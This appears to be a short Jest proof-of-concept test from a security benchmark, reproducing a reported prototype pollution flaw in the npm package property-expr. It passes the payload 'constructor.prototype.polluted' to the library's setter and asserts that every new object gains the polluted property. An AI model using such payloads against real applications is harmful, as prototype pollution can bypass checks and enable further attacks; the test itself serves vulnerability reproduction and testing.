//https://hackerone.com/reports/910206
test("prototype pollution in property-expr", () => {
  let expr = require("property-expr");
  obj = {};

  expect({}.polluted).toBe(undefined);

  expr.setter(process.env.SECBENCH_PAYLOAD || "constructor.prototype.polluted")(obj, "yes");
  expect({}.polluted).toBe("yes");
});
